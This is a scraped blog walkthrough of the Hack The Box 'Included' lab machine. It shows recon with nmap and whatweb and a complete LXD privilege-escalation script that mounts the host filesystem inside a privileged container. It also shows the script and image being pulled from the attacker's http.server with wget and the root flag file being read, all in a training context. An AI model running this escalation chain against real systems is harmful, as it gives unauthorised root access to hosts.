from the host machine function helpPanel(){ echo -e \"\\nUsage:\" echo -e \"\\t[-f] Filename (.tar.gz alpine file)\" echo -e \"\\t[-h] Show this help panel\\n\" exit 1 } function createContainer(){ lxc image import $filename --alias alpine \u0026\u0026 lxd init --auto echo -e \"[*] Listing images...\\n\" \u0026\u0026 lxc image list lxc init alpine privesc -c security.privileged=true lxc config device add privesc giveMeRoot disk source=/ path=/mnt/root recursive=true lxc start privesc lxc exec privesc sh cleanup } function cleanup(){ echo -en \"\\n[*] Removing container...\" lxc stop privesc \u0026\u0026 lxc delete privesc \u0026\u0026 lxc image delete alpine echo \" [√]\" } set -o nounset set -o errexit declare -i parameter_enable=0; while getopts \":f:h:\" arg; do case $arg in f) filename=$OPTARG \u0026\u0026 let parameter_enable+=1;; h) helpPanel;; esac done if [ $parameter_enable -ne 1 ]; then helpPanel else createContainer fi┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ All that’s left for us now is to simply follow the steps.\nStep 1: Download build-alpine =\u003e wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine [Attacker Machine] ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine --2023-05-23 17:48:43-- https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ... Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected. HTTP request sent, awaiting response... 200 OK Length: 8060 (7.9K) [text/plain] Saving to: ‘build-alpine’ build-alpine 100%[===============================\u003e] 7.87K --.-KB/s in 0s 2023-05-23 17:48:44 (62.6 MB/s) - ‘build-alpine’ saved [8060/8060] ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ Step 2: Build alpine =\u003e bash build-alpine (as root user) [Attacker Machine] ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ chmod a+x build-alpine ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ sudo ./build-alpine Determining the latest release... v3.18 Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.18/main/x86_64 Downloading alpine-keys-2.4-r1.apk tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' Downloading apk-tools-static-2.14.0-r2.apk tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' alpine-devel@lists.alpinelinux.org-6165ee59.rsa.pub: OK Verified OK % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 2617 100 2617 0 0 5262 0 --:--:-- --:--:-- --:--:-- 5286 --2023-05-23 17:53:37-- http://alpine.mirror.wearetriple.com/MIRRORS.txt Resolving alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)... 93.187.10.106, 2a00:1f00:dc06:10::106 Connecting to alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)|93.187.10.106|:80... connected. HTTP request sent, awaiting response... 200 OK Length: 2617 (2.6K) [text/plain] Saving to: ‘/home/htb-bluewalle/included/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’ /home/htb-bluewalle/inc 100%[===============================\u003e] 2.56K --.-KB/s in 0s 2023-05-23 17:53:37 (306 MB/s) - ‘/home/htb-bluewalle/included/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’ saved [2617/2617] Selecting mirror http://mirror.kumi.systems/alpine/v3.18/main fetch http://mirror.kumi.systems/alpine/v3.18/main/x86_64/APKINDEX.tar.gz (1/25) Installing alpine-baselayout-data (3.4.3-r1) (2/25) Installing musl (1.2.4-r0) (3/25) Installing busybox (1.36.0-r9) Executing busybox-1.36.0-r9.post-install (4/25) Installing busybox-binsh (1.36.0-r9) (5/25) Installing alpine-baselayout (3.4.3-r1) Executing alpine-baselayout-3.4.3-r1.pre-install Executing alpine-baselayout-3.4.3-r1.post-install (6/25) Installing ifupdown-ng (0.12.1-r2) (7/25) Installing libcap2 (2.69-r0) (8/25) Installing openrc (0.47.1-r0) Executing openrc-0.47.1-r0.post-install (9/25) Installing mdev-conf (4.5-r0) (10/25) Installing busybox-mdev-openrc (1.36.0-r9) (11/25) Installing alpine-conf (3.16.1-r1) (12/25) Installing alpine-keys (2.4-r1) (13/25) Installing alpine-release (3.18.0-r0) (14/25) Installing ca-certificates-bundle (20230506-r0) (15/25) Installing libcrypto3 (3.1.0-r4) (16/25) Installing libssl3 (3.1.0-r4) (17/25) Installing ssl_client (1.36.0-r9) (18/25) Installing zlib (1.2.13-r1) (19/25) Installing apk-tools (2.14.0-r2) (20/25) Installing busybox-openrc (1.36.0-r9) (21/25) Installing busybox-suid (1.36.0-r9) (22/25) Installing scanelf (1.3.7-r1) (23/25) Installing musl-utils (1.2.4-r0) (24/25) Installing libc-utils (0.7.2-r5) (25/25) Installing alpine-base (3.18.0-r0) Executing busybox-1.36.0-r9.trigger OK: 10 MiB in 25 packages ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ ll total 3.6M -rw-r--r-- 1 root root 3.6M May 23 17:53 alpine-v3.18-x86_64-20230523_1753.tar.gz -rwxr-xr-x 1 htb-bluewalle htb-bluewalle 7.9K May 23 17:48 build-alpine -rwxr-xr-x 1 htb-bluewalle htb-bluewalle 1.5K May 23 17:34 lxdprivesc.sh -rw-r--r-- 1 htb-bluewalle htb-bluewalle 5.4K May 23 16:56 revshell.php ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ mv alpine-v3.18-x86_64-20230523_1753.tar.gz alpinebuild.tar.gz ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ Step 3: Run this script and you will get root [Victim Machine] First, we will need to move the generated alpine file and the script over to our target. One way to achieve this is to use the http.server python module.\nIt is important to start the http server in the same directory where the two files are located.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ python -m http.server 8888 Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ... Then we use wget on our target to download these same files.\nmike@included:/var/www/html$ cd /tmp/ mike@included:/tmp$ wget http://10.10.14.75:8888/alpinebuild.tar.gz --2023-05-23 17:05:43-- http://10.10.14.75:8888/alpinebuild.tar.gz Connecting to 10.10.14.75:8888... connected. HTTP request sent, awaiting response... 200 OK Length: 3705051 (3.5M) [application/gzip] Saving to: ‘alpinebuild.tar.gz’ alpinebuild.tar.gz 100%[===================\u003e] 3.53M 23.5MB/s in 0.2s 2023-05-23 17:05:43 (23.5 MB/s) - ‘alpinebuild.tar.gz’ saved [3705051/3705051] mike@included:/tmp$ wget http://10.10.14.75:8888/lxdprivesc.sh --2023-05-23 17:05:57-- http://10.10.14.75:8888/lxdprivesc.sh Connecting to 10.10.14.75:8888... connected. HTTP request sent, awaiting response... 200 OK Length: 1451 (1.4K) [text/x-sh] Saving to: ‘lxdprivesc.sh’ lxdprivesc.sh 100%[===================\u003e] 1.42K --.-KB/s in 0s 2023-05-23 17:05:57 (70.4 MB/s) - ‘lxdprivesc.sh’ saved [1451/1451] mike@included:/tmp$ ll total 3632 drwxrwxrwt 2 root root 4096 May 23 17:05 ./ drwxr-xr-x 24 root root 4096 Oct 11 2021 ../ -rw-rw-r-- 1 mike mike 3705051 May 23 16:53 alpinebuild.tar.gz -rw-rw-r-- 1 mike mike 1451 May 23 16:34 lxdprivesc.sh mike@included:/tmp$ Finally, we run the script.\nmike@included:/tmp$ chmod a+x lxdprivesc.sh mike@included:/tmp$ ll total 3632 drwxrwxrwt 2 root root 4096 May 23 17:10 ./ drwxr-xr-x 24 root root 4096 Oct 11 2021 ../ -rw-rw-r-- 1 mike mike 3705051 May 23 16:53 alpinebuild.tar.gz -rwxrwxr-x 1 mike mike 1451 May 23 16:34 lxdprivesc.sh* mike@included:/tmp$ ./lxdprivesc.sh -f alpinebuild.tar.gz [*] Listing images... +--------+--------------+--------+-------------------------------+--------+--------+------------------------------+ | ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCH | SIZE | UPLOAD DATE | +--------+--------------+--------+-------------------------------+--------+--------+------------------------------+ | alpine | c3c843ed2546 | no | alpine v3.18 (20230523_17:53) | x86_64 | 3.53MB | May 23, 2023 at 5:11pm (UTC) | +--------+--------------+--------+-------------------------------+--------+--------+------------------------------+ Creating privesc Device giveMeRoot added to privesc ~ # Moving on to the last step.\nStep 4: Once inside the container, navigate to /mnt/root to see all resources from the host machine ~ # cd /mnt/root /mnt/root # ls -hla total 100K drwxr-xr-x 24 root root 4.0K Oct 11 2021 . drwxr-xr-x 3 root root 4.0K May 23 17:11 .. drwxr-xr-x 2 root root 4.0K Jul 26 2021 bin drwxr-xr-x 3 root root 4.0K Oct 11 2021 boot drwxr-xr-x 2 root root 4.0K Apr 23 2021 cdrom drwxr-xr-x 17 root root 3.8K May 23 14:01 dev drwxr-xr-x 98 root root 4.0K Jul 26 2021 etc drwxr-xr-x 3 root root 4.0K Mar 5 2020 home lrwxrwxrwx 1 root root 34 Jul 26 2021 initrd.img -\u003e boot/initrd.img-4.15.0-151-generic lrwxrwxrwx 1 root root 34 Oct 11 2021 initrd.img.old -\u003e boot/initrd.img-4.15.0-151-generic drwxr-xr-x 21 root root 4.0K Jul 26 2021 lib drwxr-xr-x 2 root root 4.0K Jul 26 2021 lib64 drwx------ 2 root root 16.0K Mar 5 2020 lost+found drwxr-xr-x 2 root root 4.0K Apr 23 2021 media drwxr-xr-x 2 root root 4.0K Aug 5 2019 mnt drwxr-xr-x 2 root root 4.0K Apr 23 2021 opt dr-xr-xr-x 149 root root 0 May 23 14:01 proc drwx------ 7 root root 4.0K Apr 23 2021 root drwxr-xr-x 26 root root 920 May 23 17:11 run drwxr-xr-x 2 root root 12.0K Jul 26 2021 sbin drwxr-xr-x 4 root root 4.0K Apr 23 2021 snap drwxr-xr-x 2 root root 4.0K Apr 23 2021 srv dr-xr-xr-x 13 root root 0 May 23 16:12 sys drwxrwxrwt 11 root root 4.0K May 23 17:11 tmp drwxr-xr-x 11 root root 4.0K Jul 26 2021 usr drwxr-xr-x 14 root root 4.0K Apr 23 2021 var lrwxrwxrwx 1 root root 31 Jul 26 2021 vmlinuz -\u003e boot/vmlinuz-4.15.0-151-generic lrwxrwxrwx 1 root root 31 Oct 11 2021 vmlinuz.old -\u003e boot/vmlinuz-4.15.0-151-generic /mnt/root # Since we are already here, how about grabbing the root flag?\n/mnt/root # cd root/ /mnt/root/root # ls -hlag total 40K drwx------ 7 root 4.0K Apr 23 2021 . drwxr-xr-x 24 root 4.0K Oct 11 2021 .. lrwxrwxrwx 1 root 9 Mar 11 2020 .bash_history -\u003e /dev/null -rw-r--r-- 1 root 3.0K Apr 9 2018 .bashrc drwx------ 2 root 4.0K Apr 23 2021 .cache drwxr-x--- 3 root 4.0K Mar 11 2020 .config drwx------ 3 root 4.0K Apr 23 2021 .gnupg drwxr-xr-x 3 root 4.0K Mar 5 2020 .local -rw-r--r-- 1 root 148 Aug 17 2015 .profile drwx------ 2 root 4.0K Apr 23 2021 .ssh -r-------- 1 root 33 Mar 9 2020 root.txt /mnt/root/root # cat root.txt /mnt/root/root # alpine\nTASK 7 Question: What flag do we set to the container so that it has root privileges on the host system?\nWell, since we went and used the exploit we found, the answer here may not seem so trivial. But as always, a thorough internet research simply get’s the job done.\nsecurity.privileged=true\nTASK 8 Question: If the root filesystem is mounted at /mnt in the container, where can the root flag be found on the container after the host system is mounted?\nSee Step 4 from TASK7.\n/mnt/root/\nSUBMIT FLAG Question: Submit user flag\nIt was already acquired during TASK5.\nflag\nSUBMIT FLAG Question: Submit root flag\nSimilar to the user flag, the root flag was already grabbed during TASK6.\nflag\nCongratulations, we just successfully pwned the target machine. All we have left to do now is to terminate the target box (if not terminated automatically) before we continue with the next box!\n","wordCount":"4648","inLanguage":"en","datePublished":"2023-05-23T10:00:00Z","dateModified":"2023-05-23T10:00:00Z","author":{"@type":"Person","name":"bluewalle"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_2/included/"},"publisher":{"@type":"Organization","name":"Ee-Vah?","logo":{"@type":"ImageObject","url":"https://bluewalle.github.io/main/img/48x48.svg"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://bluewalle.github.io/ accesskey=h title="Just Keep Swimming (Alt + H)"><img src=https://bluewalle.github.io/180x180_white.svg alt aria-label=logo height=35>Just Keep Swimming</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://bluewalle.github.io/posts/ title=posts><span>posts</span></a></li><li><a href=https://bluewalle.github.io/categories/ title=categories><span>categories</span></a></li><li><a href=https://bluewalle.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://bluewalle.github.io/about title=about><span>about</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://bluewalle.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://bluewalle.github.io/posts/>Posts</a></div><h1 class=post-title>HTB - Included - Walkthrough</h1><div class=post-meta><span title='2023-05-23 10:00:00 +0000 +0000'>May, 2023</span>&nbsp;·&nbsp;22 min&nbsp;·&nbsp;4648 words&nbsp;·&nbsp;bluewalle</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#setup><strong>SETUP</strong></a></li><li><a href=#task-1><strong>TASK 1</strong></a></li><li><a href=#task-2><strong>TASK 2</strong></a></li><li><a href=#task-3><strong>TASK 3</strong></a></li><li><a href=#task-4><strong>TASK 4</strong></a></li><li><a href=#task-5><strong>TASK 5</strong></a></li><li><a href=#task-6><strong>TASK 6</strong></a></li><li><a href=#task-7><strong>TASK 7</strong></a></li><li><a href=#task-8><strong>TASK 8</strong></a></li><li><a href=#submit-flag><strong>SUBMIT FLAG</strong></a></li><li><a href=#submit-flag-1><strong>SUBMIT FLAG</strong></a></li></ul></nav></div></details></div><div class=post-content><p>The aim of this walkthrough is to provide help with the <strong>Included</strong> machine on the <a href=https://hackthebox.com title="Hack The Box website">Hack The Box website</a>. Please <strong>note</strong> that no <strong>flags</strong> are directly provided here. Moreover, <strong>be aware</strong> that this is only <strong>one</strong> of the <strong>many</strong> ways to solve the challenges.</p><p>It belongs to a series of tutorials that aim to help out complete beginners with finishing the <a href=https://app.hackthebox.com/starting-point title="HTB Starting Point">Starting Point</a> <strong>TIER 2</strong> challenges.</p><h2 id=setup><strong>SETUP</strong><a hidden class=anchor aria-hidden=true href=#setup>#</a></h2><p>There are a couple of ways to <strong>connect</strong> to the <strong>target machine</strong>. The one we will be using <strong>throughout</strong> this <strong>walkthrough</strong> is via the provided <strong>pwnbox</strong>.</p><p>Once our <strong>connection</strong> is taken care of, we <strong>spawn</strong> the <strong>target</strong> <strong>machine</strong>.</p><p>Additionally - even though not required - it is possible to set a <strong>local</strong> variable (only available in the current <strong>shell</strong>) containing our <strong>target host&rsquo;s</strong> IP address. Once set, we can easily <strong>access</strong> it by prepending a <em>$</em> to our variable name.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$rhost</span><span class=o>=</span>&lt;target-hosts-ip&gt;
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $ <span class=nb>echo</span> <span class=nv>$rhost</span> 
</span></span><span class=line><span class=cl>&lt;target-hosts-ip&gt;
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><p>We could use the <em><strong>unset</strong></em> command to remove it after we no longer need it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>✗<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$unset</span> rhost 
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><h2 id=task-1><strong>TASK 1</strong><a hidden class=anchor aria-hidden=true href=#task-1>#</a></h2><p><strong>Question</strong>: <em>What service is running on the target machine over UDP?</em></p><p>Our <strong>recon</strong> phase starts with a quick <strong>connection check</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ ping <span class=nv>$rhost</span> -c <span class=m>4</span>
</span></span><span class=line><span class=cl>PING 10.129.112.221 <span class=o>(</span>10.129.112.221<span class=o>)</span> 56<span class=o>(</span>84<span class=o>)</span> bytes of data.
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.112.221: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>1</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>63</span> <span class=nv>time</span><span class=o>=</span>10.6 ms
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.112.221: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>2</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>63</span> <span class=nv>time</span><span class=o>=</span>9.81 ms
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.112.221: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>3</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>63</span> <span class=nv>time</span><span class=o>=</span>10.3 ms
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.112.221: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>4</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>63</span> <span class=nv>time</span><span class=o>=</span>10.2 ms
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>--- 10.129.112.221 ping statistics ---
</span></span><span class=line><span class=cl><span class=m>4</span> packets transmitted, <span class=m>4</span> received, 0% packet loss, <span class=nb>time</span> 3005ms
</span></span><span class=line><span class=cl>rtt min/avg/max/mdev <span class=o>=</span> 9.811/10.259/10.649/0.299 ms
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>followed by the usual (version, script, top1000-ports) <strong>tcp</strong> <em><strong>nmap</strong></em> scan.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ nmap -sC -sV <span class=nv>$rhost</span> 
</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-05-23 15:03 BST
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.112.221
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.050s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>999</span> closed tcp ports <span class=o>(</span>conn-refused<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.29 <span class=o>((</span>Ubuntu<span class=o>))</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.29 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> http-title: Site doesn<span class=err>&#39;</span>t have a title <span class=o>(</span>text/html<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>UTF-8<span class=o>)</span>.
</span></span><span class=line><span class=cl><span class=p>|</span>_Requested resource was http://10.129.112.221/?file<span class=o>=</span>home.php
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 7.56 seconds
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>It looks like our <strong>target</strong> is <strong>running</strong> a <strong>web server</strong> on port 80. Let&rsquo;s get a <strong>fingerprint</strong> on the website.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ whatweb <span class=nv>$rhost</span>
</span></span><span class=line><span class=cl>http://10.129.112.221 <span class=o>[</span><span class=m>302</span> Found<span class=o>]</span> Apache<span class=o>[</span>2.4.29<span class=o>]</span>, Country<span class=o>[</span>RESERVED<span class=o>][</span>ZZ<span class=o>]</span>, HTTPServer<span class=o>[</span>Ubuntu Linux<span class=o>][</span>Apache/2.4.29 <span class=o>(</span>Ubuntu<span class=o>)]</span>, IP<span class=o>[</span>10.129.112.221<span class=o>]</span>, RedirectLocation<span class=o>[</span>http://10.129.112.221/index.php?file<span class=o>=</span>home.php<span class=o>]</span>
</span></span><span class=line><span class=cl>http://10.129.112.221/index.php?file<span class=o>=</span>home.php <span class=o>[</span><span class=m>301</span> Moved Permanently<span class=o>]</span> Apache<span class=o>[</span>2.4.29<span class=o>]</span>, Country<span class=o>[</span>RESERVED<span class=o>][</span>ZZ<span class=o>]</span>, HTTPServer<span class=o>[</span>Ubuntu Linux<span class=o>][</span>Apache/2.4.29 <span class=o>(</span>Ubuntu<span class=o>)]</span>, IP<span class=o>[</span>10.129.112.221<span class=o>]</span>, RedirectLocation<span class=o>[</span>http://10.129.112.221/?file<span class=o>=</span>home.php<span class=o>]</span>, Title<span class=o>[</span><span class=m>301</span> Moved Permanently<span class=o>]</span>
</span></span><span class=line><span class=cl>http://10.129.112.221/?file<span class=o>=</span>home.php <span class=o>[</span><span class=m>200</span> OK<span class=o>]</span> Apache<span class=o>[</span>2.4.29<span class=o>]</span>, Country<span class=o>[</span>RESERVED<span class=o>][</span>ZZ<span class=o>]</span>, HTTPServer<span class=o>[</span>Ubuntu Linux<span class=o>][</span>Apache/2.4.29 <span class=o>(</span>Ubuntu<span class=o>)]</span>, IP<span class=o>[</span>10.129.112.221<span class=o>]</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
